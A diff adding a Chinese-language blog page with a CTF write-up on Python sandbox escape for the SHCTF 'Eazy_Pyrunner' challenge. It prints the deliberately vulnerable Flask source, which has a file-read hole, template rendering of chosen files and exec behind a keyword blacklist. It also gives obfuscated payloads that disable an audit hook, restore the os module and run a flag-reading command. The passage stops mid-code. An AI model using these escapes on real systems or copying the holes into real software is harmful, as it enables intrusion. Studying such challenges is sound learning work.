@@ -1,0 +1,721 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="https://gitee.com/bobrocket/img/raw/master/Snipaste_2025-12-30_21-02-15.png">
+  <link rel="icon" href="https://gitee.com/bobrocket/img/raw/master/Snipaste_2025-12-30_21-02-15.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="suny">
+  <meta name="keywords" content="">
+  <meta name="referrer" content="no-referrer">
+  
+    <meta name="description" content="引子[SHCTF_3rd]Eazy_Pyrunner通过任意文件读取漏洞我们可以读到源代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pyjail沙箱逃逸">
+<meta property="og:url" content="https://www.sunynov.top/2026/03/23/Pyjail%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/index.html">
+<meta property="og:site_name" content="suny">
+<meta property="og:description" content="引子[SHCTF_3rd]Eazy_Pyrunner通过任意文件读取漏洞我们可以读到源代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260323191949266.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260323192947298.png">
+<meta property="og:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260323193027039.png">
+<meta property="article:published_time" content="2026-03-23T11:03:14.000Z">
+<meta property="article:modified_time" content="2026-03-26T00:52:51.398Z">
+<meta property="article:author" content="suny">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/bobrocket/img/raw/master/image-20260323191949266.png">
+  
+  
+  
+  <title>Pyjail沙箱逃逸 - suny</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.sunynov.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>suny</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Pyjail沙箱逃逸"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        suny
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-23 19:03" pubdate>
+          2026年3月23日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          980 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          9 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Pyjail沙箱逃逸</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2026年3月26日 早上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h2><h3 id="SHCTF-3rd-Eazy-Pyrunner"><a href="#SHCTF-3rd-Eazy-Pyrunner" class="headerlink" title="[SHCTF_3rd]Eazy_Pyrunner"></a>[SHCTF_3rd]Eazy_Pyrunner</h3><p>通过任意文件读取漏洞我们可以读到源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> flask import Flask, render_template_string, request, jsonify<br>import subprocess<br>import tempfile<br>import os<br>import sys<br><br>app = <span class="hljs-title function_ invoke__">Flask</span>(__name__)<br><br>@app.<span class="hljs-title function_ invoke__">route</span>(<span class="hljs-string">&#x27;/&#x27;</span>)<br>def <span class="hljs-title function_ invoke__">index</span>():<br>    <span class="hljs-comment"># 获取文件名参数，默认读取 &#x27;pages/index.html&#x27;</span><br>    file_name = request.args.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;pages/index.html&#x27;</span>)<br>    <br>    <span class="hljs-keyword">try</span>:<br>        with <span class="hljs-title function_ invoke__">open</span>(file_name, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            content = f.<span class="hljs-title function_ invoke__">read</span>()<br>    except <span class="hljs-built_in">Exception</span> <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-comment"># 如果文件不存在或出错，回退到默认页面</span><br>        with <span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;pages/index.html&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            content = f.<span class="hljs-title function_ invoke__">read</span>()<br>            <br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">render_template_string</span>(content)<br><br>def <span class="hljs-title function_ invoke__">waf</span>(code):<br>    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">    简单的关键字过滤函数</span><br><span class="hljs-string">    &quot;</span><span class="hljs-string">&quot;&quot;</span><br>    blacklisted_keywords = [<br>        <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;write&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <br>        <span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <br>        <span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span><br>    ]<br>    <br>    <span class="hljs-keyword">for</span> keyword in blacklisted_keywords:<br>        <span class="hljs-keyword">if</span> keyword in code:<br>            <span class="hljs-keyword">return</span> False<br>    <span class="hljs-keyword">return</span> True<br><br>@app.<span class="hljs-title function_ invoke__">route</span>(<span class="hljs-string">&#x27;/execute&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])<br>def <span class="hljs-title function_ invoke__">execute_code</span>():<br>    code = request.json.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <br>    <span class="hljs-keyword">if</span> not code:<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">jsonify</span>(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;请输入Python代码&#x27;</span>&#125;)<br>    <br>    <span class="hljs-keyword">if</span> not <span class="hljs-title function_ invoke__">waf</span>(code):<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">jsonify</span>(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;Hacker!&#x27;</span>&#125;)<br>    <br>    temp_file_name = None<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 创建临时文件</span><br>        with tempfile.<span class="hljs-title function_ invoke__">NamedTemporaryFile</span>(mode=<span class="hljs-string">&#x27;w&#x27;</span>, suffix=<span class="hljs-string">&#x27;.py&#x27;</span>, delete=False) <span class="hljs-keyword">as</span> f:<br>            <span class="hljs-comment"># 构造包含审计钩子 (Audit Hook) 的沙箱代码</span><br>            sandbox_code = f<span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">import sys</span><br><span class="hljs-string">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">def is_my_love_event(event_name):</span><br><span class="hljs-string">    return event_name.startswith(&quot;</span>Nothing is my love but you.<span class="hljs-string">&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">def my_audit_hook(event_name, arg):</span><br><span class="hljs-string">    if len(event_name) &gt; 0:</span><br><span class="hljs-string">        raise RuntimeError(&quot;</span>Too long event name!<span class="hljs-string">&quot;)</span><br><span class="hljs-string">    if len(arg) &gt; 0:</span><br><span class="hljs-string">        raise RuntimeError(&quot;</span>Too long arg!<span class="hljs-string">&quot;)</span><br><span class="hljs-string">    if not is_my_love_event(event_name):</span><br><span class="hljs-string">        raise RuntimeError(&quot;</span>Hacker out!<span class="hljs-string">&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;code&#125;</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br>            f.<span class="hljs-title function_ invoke__">write</span>(sandbox_code)<br>            temp_file_name = f.name<br><br>        <span class="hljs-comment"># 执行临时文件</span><br>        result = subprocess.<span class="hljs-title function_ invoke__">run</span>(<br>            [sys.executable, temp_file_name],<br>            capture_output=True,<br>            text=True,<br>            timeout=<span class="hljs-number">10</span><br>        )<br>        <br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">jsonify</span>(&#123;<br>            <span class="hljs-string">&#x27;stdout&#x27;</span>: result.stdout,<br>            <span class="hljs-string">&#x27;stderr&#x27;</span>: result.stderr<br>        &#125;)<br><br>    except subprocess.TimeoutExpired:<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">jsonify</span>(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: <span class="hljs-string">&#x27;代码执行超时（超过10秒）&#x27;</span>&#125;)<br>    <br>    except <span class="hljs-built_in">Exception</span> <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">jsonify</span>(&#123;<span class="hljs-string">&#x27;error&#x27;</span>: f<span class="hljs-string">&#x27;执行出错: &#123;str(e)&#125;&#x27;</span>&#125;)<br>    <br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-comment"># 清理临时文件</span><br>        <span class="hljs-keyword">if</span> temp_file_name <span class="hljs-keyword">and</span> os.path.<span class="hljs-title function_ invoke__">exists</span>(temp_file_name):<br>            os.<span class="hljs-title function_ invoke__">unlink</span>(temp_file_name)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.<span class="hljs-title function_ invoke__">run</span>(debug=True)<br></code></pre></td></tr></table></figure>
+
+<p>一个python执行沙盒，我们重点关注两部分</p>
+<p>WAF：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">blacklisted_keywords = [<br>        <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;read&#x27;</span>, <span class="hljs-string">&#x27;write&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <br>        <span class="hljs-string">&#x27;__&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;sys&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>, <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <br>        <span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\&quot;&#x27;</span><br>    ]<br></code></pre></td></tr></table></figure>
+
+<p>沙箱：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>sys.modules[<span class="hljs-string">&#x27;os&#x27;</span>] = <span class="hljs-string">&#x27;not allowed&#x27;</span>  <span class="hljs-comment">#重新定义os模块为字符串</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_my_love_event</span>(<span class="hljs-params">event_name</span>):<br>    <span class="hljs-keyword">return</span> event_name.startswith(<span class="hljs-string">&quot;Nothing is my love but you.&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_audit_hook</span>(<span class="hljs-params">event_name, arg</span>):  <span class="hljs-comment">#审计钩子</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(event_name) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;Too long event name!&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(arg) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;Too long arg!&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_my_love_event(event_name):<br>        <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;Hacker out!&quot;</span>)<br><br><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).addaudithook(my_audit_hook)<br></code></pre></td></tr></table></figure>
+
+<p>python有一个特性，我们可以重新定义内置函数</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260323191949266.png" srcset="/img/loading.gif" lazyload alt="image-20260323191949266"></p>
+<p>这样我们就可以绕过审计钩子</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">len</span>(<span class="hljs-params">x</span>):<span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_my_love_event</span>(<span class="hljs-params">x</span>):<span class="hljs-keyword">return</span> TRUE<br></code></pre></td></tr></table></figure>
+
+<h4 id="方法一（恢复os模块）"><a href="#方法一（恢复os模块）" class="headerlink" title="方法一（恢复os模块）"></a>方法一（恢复os模块）</h4><p>下面我们用typhon绕一下WAF</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> ()).gi_frame.f_builtins[<span class="hljs-built_in">bytes</span>([<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">112</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>]).decode()](<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(uuid=<span class="hljs-number">9</span>))[<span class="hljs-number">0</span>])._get_command_stdout(<span class="hljs-built_in">bytes</span>([<span class="hljs-number">47</span>,<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">97</span>,<span class="hljs-number">100</span>,<span class="hljs-number">95</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>]))<br></code></pre></td></tr></table></figure>
+
+<p>我们发现会报错，原因是uuid需要os模块而它被污染，那么有没有办法恢复</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260323192947298.png" srcset="/img/loading.gif" lazyload alt="image-20260323192947298"></p>
+<p>os模块对象被污染所以无法重载</p>
+<p><img src="https://gitee.com/bobrocket/img/raw/master/image-20260323193027039.png" srcset="/img/loading.gif" lazyload alt="image-20260323193027039"></p>
+<p>直接删除就行了</p>
+<p>最终payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">len</span>(<span class="hljs-params">x</span>):<span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_my_love_event</span>(<span class="hljs-params">x</span>):<span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-keyword">del</span> (a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> ()).gi_frame.f_builtins[<span class="hljs-built_in">bytes</span>([<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">112</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>]).decode()](<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">121</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)).modules[<span class="hljs-built_in">bytes</span>([<span class="hljs-number">111</span>, <span class="hljs-number">115</span>]).decode()]<br><span class="hljs-built_in">print</span>((a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> ()).gi_frame.f_builtins[<span class="hljs-built_in">bytes</span>([<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">112</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>]).decode()](<span class="hljs-built_in">list</span>(<span class="hljs-built_in">dict</span>(ssecorpbus=<span class="hljs-number">9</span>))[<span class="hljs-number">0</span>][::-<span class="hljs-number">1</span>]).getoutput(<span class="hljs-built_in">bytes</span>([<span class="hljs-number">47</span>, <span class="hljs-number">114</span>, <span class="hljs-number">101</span>, <span class="hljs-number">97</span>, <span class="hljs-number">100</span>, <span class="hljs-number">95</span>, <span class="hljs-number">102</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">103</span>]).decode()))<br></code></pre></td></tr></table></figure>
+
+<h3 id="方法二（继承链）"><a href="#方法二（继承链）" class="headerlink" title="方法二（继承链）"></a>方法二（继承链）</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/seizer/p/19574448">Python 沙箱逃逸学习笔记 - se1zer - 博客园</a></p>
+<p>我们可以通过继承链找到已经加载os模块的子类</p>
+<p>关键字绕过方法可以参考ssti</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 构造关键字符串</span><br>clss = <span class="hljs-built_in">str</span>().join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x5f</span>])      <span class="hljs-comment"># __class__</span><br>mro = <span class="hljs-built_in">str</span>().join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x5f</span>])                <span class="hljs-comment"># __mro__</span><br>sclss = <span class="hljs-built_in">str</span>().join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x62</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x5f</span>])  <span class="hljs-comment"># __subclasses__</span><br>it = <span class="hljs-built_in">str</span>().join(<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x5f</span>,<span 